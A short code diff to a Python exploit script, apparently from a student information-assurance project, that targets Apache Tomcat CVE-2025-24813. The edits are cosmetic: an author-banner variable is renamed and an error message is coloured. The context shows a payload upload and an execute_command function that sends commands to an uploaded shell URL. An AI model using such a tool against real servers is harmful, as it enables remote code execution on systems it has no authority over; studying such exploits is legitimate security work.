@@ -55,7 +55,7 @@ RED = Fore.RED + Style.BRIGHT
 GREEN = Fore.GREEN + Style.BRIGHT
 RESET = Style.RESET_ALL
 
-text = "By: Mitchell Zhou, Yunna Wang, Jeet Vijaywargi"
+authors = "By: Mitchell Zhou, Yunna Wang, Jeet Vijaywargi"
 banner = f"""
 
    ██████╗  ███████╗ ███╗   ██╗     █████╗  ██╗  █████╗
@@ -67,7 +67,7 @@ banner = f"""
 ╔═══════════════════════════════════════════════════════╗
 ║{RED} Applied Information Assurance {RESET}| {CYAN}Tomcat_CVE-2025-24813{RESET} ║
 ╚═══════════════════════════════════════════════════════╝
-   🕵️  {text} 👮
+   🕵️  {authors} 👮
    
 {CYAN}Uploading Payload...{RESET}
 """
@@ -101,7 +101,7 @@ def execute_command(shell_url, command):
         if response.status_code == 200:
             return response.text
     except Exception as e:
-        print(f"[-] Execution error: {e}")
+        print(f"{RED}[-] Execution error: {e}{RESET}")
     return None
 
 
